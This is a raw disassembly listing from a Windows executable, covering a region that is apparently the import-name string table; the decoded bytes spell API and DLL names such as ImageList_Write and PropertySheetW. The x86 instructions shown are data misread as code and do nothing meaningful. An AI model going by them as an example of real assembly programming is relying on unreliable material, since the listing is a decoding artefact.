  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
